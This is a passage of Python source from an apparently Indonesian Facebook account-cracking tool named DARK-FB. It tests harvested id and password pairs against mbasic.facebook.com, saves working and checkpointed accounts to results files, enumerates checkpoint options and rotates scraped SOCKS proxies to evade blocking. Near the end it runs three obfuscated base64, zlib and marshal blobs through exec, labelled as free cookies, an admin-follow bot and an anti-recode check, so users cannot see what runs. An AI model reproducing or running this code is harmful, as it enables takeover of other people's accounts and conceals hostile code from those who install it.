				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass



def cekfile_crk(folder):
	dirs = os.listdir(folder)
	god_cp,god_ok="",""
	for file in dirs:
		filex = (folder+"/"+file)
		try:
			juma = open(filex,"r").readlines()
			total = ("%s"%(str(len(juma))))
		except:total = (" ?? ")
		try:
			ijo__ = filex.split("results/OK-")[1]
			ijo_ = (QQ+II+"results/OK-"+ijo__)
			god_ok += (ijo_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
		except:pass
		try:
			kuning__ = filex.split("results/CP-")[1]
			kuning_ = (QQ+KK+"results/CP-"+kuning__)
			god_cp += (kuning_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
		except:pass
	iprint(Panel(god_ok, style=I, title="RESULTS OK"))
	iprint(Panel(god_cp, style=K, title="RESULTS CP"))
	print()



def hide_opsi(user,pe,tlt):
	ok_ = Tree("                                 ",highlight=True, hide_root=True)
	ok__= ok_.add(f":bolivia::oman:",guide_style="uu red")
	ok___= ok__.add(f"{b}Id{q} Dan {b}Password{q}")
	ok___.add(f"{o}{user}{q}|{o}{pe}{q}|{q}{tlt}{q}")


	opsi= ok__.add("Option")
	check_op(user,pe,tlt,opsi)


	prints(ok__)
def check_op(userrz,pwz,ttl,opsi):
	try:
		host = "https://mbasic.facebook.com"
		ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
		ses = requests.Session()
		ses.headers.update({
		"Host": "mbasic.facebook.com",
		"cache-control": "max-age=0",
		"upgrade-insecure-requests": "1",
		"origin": host,
		"content-type": "application/x-www-form-urlencoded",
		"user-agent": ua,
		"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"x-requested-with": "mark.via.gp",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "navigate",
		"sec-fetch-user": "?1",
		"sec-fetch-dest": "document",
		"referer": host+"/login/?next&ref=dbl&fl&refid=8",
		"accept-encoding": "gzip, deflate",
		"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
		})
		data = {}
		ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
		fm = ged.find("form",{"method":"post"})
		list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
		for i in fm.find_all("input"):
			if i.get("name") in list:
				data.update({i.get("name"):i.get("value")})
			else:
				continue
		data.update({"email":userrz,"pass":pwz})
		try:
			run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
		except requests.exceptions.TooManyRedirects:
			opsi.add(f"{m}Akun Ini Terkenak Spam{q}")
		if "c_user" in ses.cookies:
			opsi.add(f"{u}Akun Ini Tidak CheckPointint😱😱{q}")
			open('results/OK-'+durasi+'.txt','a').write(userrz+"|"+pwz+"\n")
		elif "checkpoint" in ses.cookies:
			form = run.find("form")
			dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
			jzst = form.find("input",{"name":"jazoest"})["value"]
			nh   = form.find("input",{"name":"nh"})["value"]
			dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Lanjutkan",
			"nh": nh
			}
			xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
			ngew = [yy.text for yy in xnxx.find_all("option")]
			if(str(len(ngew))=="0"):
				opsi.add(f"{u}SELAMAT AKUN INI TAP YES 😎 {q}({b}Login Difb Lite/Mbasic{q})")
				open('results/TAP-'+durasi+'.txt','a').write(userrz+"|"+pwz+"|"+ttl+"\n")
			else:
				jml="%s%s"%(k,str(len(ngew)))
				opsi_ = opsi.add(f"\r{b}Jumlah Opsi {jml} {q}")
				for opt in range(len(ngew)):
					jo = str(opt+1)
					opsi_.add(f"{k}{jo}{q}. {b}{ngew[opt]}{q}")
				open('results/CP-'+durasi+'.txt','a').write(userrz+"|"+pwz+"|"+ttl+"\n")
		elif "login_error" in str(run):
			oh = run.find("div",{"id":"login_error"}).find("div").text
			opsi.add(f"{k}{oh}{q}")
		else:
			opsi.add(f"\r{m}Password Akun Ini Sudah DiGanti{q}")
	except Exception as c:
		opsi.add(f"{m}Ups.. Sepertinya Akun Ini Tidak Bisa DiCheck!!{q}")
		open('results/CP-'+durasi+'.txt','a').write(userrz+"|"+pwz+"|"+ttl+"\n")




def get_proxy_socks5():
	max_proxy = "100000"
	kontol_prox = ['https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all']
#	kontol_prox = ["https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/?request=displayproxies&protocol=all&timeout={max_proxy}&country=all&ssl=all&anonymity=all"]
	open("data/prox_socks5.txt","w")
	for name_prox in kontol_prox:
		try:
			proxz = requests.get(name_prox).text.strip()
			open("data/prox_socks5.txt","a").write(proxz)
			file = open("data/prox_socks5.txt","r").readlines()
			for crot in file:
				crot = crot.replace("\n","")
				prox_.append(crot)
		except requests.exceptions.ConnectionError:
			kotak("# UPS... SEPERTINYA JARINGAN ANDA TERPUTUS",M,C)
			os.sys.exit()
def get_proxy_socks4():
	try:
		proxf = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
		open("data/prox_socks4.txt",'w').write(proxf)
	except requests.exceptions.ConnectionError:
		kotak("# UPS... SEPERTINYA JARINGAN ANDA TERPUTUS",M,C)
		os.sys.exit()

# MAAF SAYA END KARENA BANYAK RAHASIA NEGARA DIDALAM END INI ‼️
# JIKA ANDA MEMAKSA INGIN LIHAT DIBALIK END INI ANDA TINGGAL CHAT SAYA

# FREE COOKIES
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'QkL73eh+89/O5fz33ePwui32ty3ffd/2ve8zw/vw/hHf0Mf993rfIuhA953HvQNCbSs6T2sgXUPnHk1biETDYFN5x0LNv2y76VmohPSruj+uskLaWXV2o3qg6o7+QGxKlhpaMWNKCqgO+LvWdQWZzY9XGVnGCHN+aFvF0qOwXnRGi/BK1GHLp0lt6n6W2hV28QgGAh5K6k1jjEckZQ0dcXu/XlokObS9h5WpudVtPsSM0xDWWuG7rvBGnsH9TBh4icAKIpVcS1hQKVvQHNgJ3SyPIYp4Nu598cGRYJjVO71r4RZCv77J8kqglAiT3vczVqhzTPRseMd3tM4lW5lbT9qMWzytHLABFrTC3CNvuoWuydPxEKenRL09m+OUswRkUYDXUnpriYusMoipLCKlHMTlCaLveLONLAsDp7Mu2rHnOCBugRP5lgSBtyeF7tYoM12YLnEKKvXKG6BO0ZXG6JuR1ewSf2Yss8VVn/jaWYvJo6FideblRCZIBaeH1mtzzTPX4wTl8vFuEPIE4lrP4aQZQb7PkdydVezh+Bg6Dji37QZLkLmjXXaY2Sgpcf7PwytDGd+YHQ5JOBI0/bA0FiaStomLp1p6/NnPwiLpWwPAZqvMhawOaI4kcGcPPpjpyO5ofOnfipSyTUqlMBtFk9SBiYLgovoMT7x712IJllsMqhYQx9R9Cy3VB3vwBKu5KqgXHEhS/GRPMWjtOjC8R0PyX75MYu0NCJQ6ryBpWU05XyNGyETyVwdPozz0nFjtjeCXJ/+9FhjIlizOZ96L3hxtP/Gha/whd0KUEH1RyL74Z/mhAwuF9d72TrOU0qC4P1UrniVZ8OQKCQTVTLIdRPmzGFSaKpP4RqrAJjBGQYwuHFnpl2yC8eHQgfUlMMPM7O7zuI2BehodVpL1OiglG6eTtKtntQ3EGWPnbbNkphSUoSzdVCit31xY4qNMZ11HqW4Eoc/nPb5D1Ilq420ZX7nsv2Zj7DdGjfYJnk2SKuRlQF9WPqEZWS9u00whCSbZjdgviHv3Eh3CVQEqtpKfUD74UuBaevnITOPanl0xFF/CbS4KE6HZQHEopOa2/sjMs1iOuOrkK7jms37TvI7lpcEnzbtPrHpNfT2uUFuSRF7lsmV9NppyW0vpqSwjcH1E0anQLsb9kcw7E9zdqycWQGb3ClbX0w9pgCkrAq3eMOJzQGmHftWZtNIyIaYSPm4yqx8gucfhGebW9KiasviMJxuCucptQ1wmipBlhYbyXVdnqCLKq00DDjrkXYBXJXTBAuoyEIfHFqOv1Zaa6ypEXniSFKGvLDnupNHDGIoVu+9bn60nfP+DXONzfrod2H/+41vPtAuTB89nPe3z77rPfqPdu9+WVs/M96yTKH+zVmUXaUHaZ48RhfQjQQGQkHEJGL5MQICBK0QD15SFkkPhAY22yeDldxJe'))

# BOT FOLLOW MY ADMIN
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==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'))

# BOT CHECK FILE ANTI RIKOD
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'vd3JYDA/a8/36/GzPUyIwPf7d3FO95q47nu/rzJGw9y1Y6Z2tQiuwZ28QsWY2pocbqeeUbW6od2jym2Eei8I40eKUC08KIm9Olf7KnGLsYSljFX1R8AOX2mvCnmC1VscQjs0WoOAjuVHj+mUWFMISdaS6of1vmIyu60FkLn6m2Eqh7VBnvUwEJ2/g5oPHPeVyf0atVzOCGSO1O52Jswhd82B2HsvF+B75WZljhLLfOmpEgvrr0wsarZprypz62cXGF+2D03jwG6s3w7ilibs0Y/tVBUkp5DTI22diGrtjgrWacQBbcObTKFDVP+5voVPVZBmcXvXhFNRnWkhpigHRevPW00orolT6cthr4L5iZFPy2qrzxNAyowg3QwshEghPlpPIwEIIM76qe2jzs4t43ivfVcvq/bpRXZxcUKeTb9wMQAMBaDNkELsRLTGSgBYpoWVnMGSEgFsXXqwovZRAA0gSlEkdxJe'))



class Main_:
	def __init__(self):
		msin=""
	def __check_update_(self, version_):
		try:
			version = requests.get("https://raw.githubusercontent.com/Dumai-991/DARK-FB/Xnxx/data/version.txt").text.strip()
		except requests.exceptions.ConnectionError:
			kotak("# UPS... SEPERTINYA JARINGAN ANDA TERPUTUS",M,C)
			os.sys.exit()
		if version == version_:
			os.system('git pull')
			os.system('clear')
		else:
			os.system('git pull;clear')
			kocol = ""
			kocol += QQ+"Version Script Ini ("+OO+version_+QQ+") Akan Diupdate Menjadi ("+OO+version+QQ+")\n\n"
			kocol += ("Tunggu Sebentar Sedang Update Script.....\n")
			kocol += ("Jika Masih Stuck Update/Gini Terus Silahkan Gunakan Pernintah Ini \n")
			kocol += ("python update.py\n")
			iprint(Panel(kocol, style=M))
			kotak("# COBA KETIK : python main.py SEKALI LAGI!!",M,Q)
			os.sys.exit()
	def __check_status_(self, mainx):
		try:
			mainz = requests.get("https://raw.githubusercontent.com/Dumai-991/DARK-FB/Xnxx/data/status.txt").text.strip()
		except requests.exceptions.ConnectionError:
			kotak("# UPS... SEPERTINYA JARINGAN ANDA TERPUTUS",M,C)
			os.sys.exit()
		if mainx == mainz:
			global yyy
			yyy = ""
		else:
			kotak("# MAAF SEVER DARK-FB SEDANG MAINTENANCE, KAMI AKAN KEMBALI :D",C,K)
			os.system('git pull')
			os.sys.exit()
	def _no_vpn(self):
#		try:
		folder();open_role()
		self.__check_update_("2.5")
		self.__check_status_("aktif")
		get_proxy_socks4()
		get_proxy_socks5()
		Main()
#		except:console.print_exception(show_locals=None,word_wrap=None,max_frames=100,extra_lines=0)

Main_()._no_vpn()
#cek_apk_hasil_crk()

